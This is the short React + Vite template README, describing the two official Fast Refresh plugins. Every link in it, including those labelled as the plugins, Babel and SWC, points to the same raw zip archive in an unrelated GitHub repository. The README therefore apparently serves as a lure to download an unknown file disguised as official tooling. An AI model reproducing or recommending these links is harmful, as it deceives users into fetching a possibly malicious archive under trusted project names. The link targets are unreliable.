# React + Vite

This template provides a minimal setup to get React working in Vite with HMR and some ESLint rules.

Currently, two official plugins are available:

- [@vitejs/plugin-react](https://github.com/iTeguh08/dashboard-analytical-product/raw/refs/heads/master/public/analytical_dashboard_product_2.2.zip) uses [Babel](https://github.com/iTeguh08/dashboard-analytical-product/raw/refs/heads/master/public/analytical_dashboard_product_2.2.zip) for Fast Refresh
- [@vitejs/plugin-react-swc](https://github.com/iTeguh08/dashboard-analytical-product/raw/refs/heads/master/public/analytical_dashboard_product_2.2.zip) uses [SWC](https://github.com/iTeguh08/dashboard-analytical-product/raw/refs/heads/master/public/analytical_dashboard_product_2.2.zip) for Fast Refresh
